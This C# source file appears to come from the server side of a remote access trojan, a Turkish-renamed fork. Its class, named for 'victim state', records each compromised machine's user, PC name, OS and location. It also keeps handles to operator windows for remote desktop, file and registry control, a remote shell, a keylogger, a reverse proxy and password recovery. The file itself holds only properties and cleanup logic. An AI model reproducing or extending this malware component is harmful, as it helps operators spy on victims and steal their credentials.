using System;
using System.Windows.Forms;
using xServer.Formlar;
using xServer.KuuhakuCekirdek.ReverseProxy;
using xServer.KuuhakuCekirdek.UTIlityler;

namespace xServer.KuuhakuCekirdek.Ağ
{
    public class KurbanDurumu : IDisposable
    {
        public string Versiyon { get; set; }
        public string IşletimSistemi { get; set; }
        public string HesapTürü { get; set; }
        public int ImageIndex { get; set; }
        public string Ülke { get; set; }
        public string ÜlkeKodu { get; set; }
        public string Bölge { get; set; }
        public string Şehir { get; set; }
        public string Id { get; set; }
        public string KullanıcıAdi { get; set; }
        public string PcAdi { get; set; }
        public string KullanıcıPcde { get { return string.Format("{0}@{1}", KullanıcıAdi, PcAdi); } }
        public string CountryWithCode { get { return string.Format("{0} [{1}]", Ülke, ÜlkeKodu); } }
        public string Etiket { get; set; }
        public string DownloadDirectory { get; set; }


        public FrmUzakMasaüstü FrmRdp { get; set; }
        public FrmGörevYöneticisi FrmTm { get; set; }
        public FrmDosyaYöneticisi FrmFm { get; set; }
        public FrmKayıtDefteriEditor FrmRe { get; set; }
        public FrmSistemBilgisi FrmSi { get; set; }
        public FrmUzakKabuk FrmRs { get; set; }
        public FrmBaşlangıçYöneticisi FrmStm { get; set; }
        public FrmKeylogger FrmKl { get; set; }
        public FrmTersProxy FrmProxy { get; set; }
        public FrmŞifreKurtarımı FrmPass { get; set; }

        public bool ReceivedLastDirectory { get; set; }
        public UnsafeStreamCodec StreamCodec { get; set; }
        public ReverseProxyServer ProxyServer { get; set; }

        public bool ProcessingDirectory
        {
            get
            {
                lock (_processingDirectoryLock)
                {
                    return _processingDirectory;
                }
            }
            set
            {
                lock (_processingDirectoryLock)
                {
                    _processingDirectory = value;
                }
            }
        }
        private bool _processingDirectory;
        private readonly object _processingDirectoryLock;

        public KurbanDurumu()
        {
            ReceivedLastDirectory = true;
            _processingDirectory = false;
            _processingDirectoryLock = new object();
        }

        public void Dispose()
        {
            Dispose(true);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                try
                {
                    if (FrmRdp != null)
                        FrmRdp.Invoke((MethodInvoker)delegate { FrmRdp.Close(); });
                    if (FrmTm != null)
                        FrmTm.Invoke((MethodInvoker)delegate { FrmTm.Close(); });
                    if (FrmFm != null)
                        FrmFm.Invoke((MethodInvoker)delegate { FrmFm.Close(); });
                    if (FrmRe != null)
                        FrmRe.Invoke((MethodInvoker)delegate { FrmRe.Close(); });
                    if (FrmSi != null)
                        FrmSi.Invoke((MethodInvoker)delegate { FrmSi.Close(); });
                    if (FrmRs != null)
                        FrmRs.Invoke((MethodInvoker)delegate { FrmRs.Close(); });
                    if (FrmStm != null)
                        FrmStm.Invoke((MethodInvoker)delegate { FrmStm.Close(); });
                    if (FrmKl != null)
                        FrmKl.Invoke((MethodInvoker)delegate { FrmKl.Close(); });
                    if (FrmProxy != null)
                        FrmProxy.Invoke((MethodInvoker)delegate { FrmProxy.Close(); });
                    if (FrmPass != null)
                        FrmPass.Invoke((MethodInvoker)delegate { FrmPass.Close(); });
                }
                catch (InvalidOperationException)
                {
                }

                if (StreamCodec != null)
                    StreamCodec.Dispose();
            }
        }
    }
}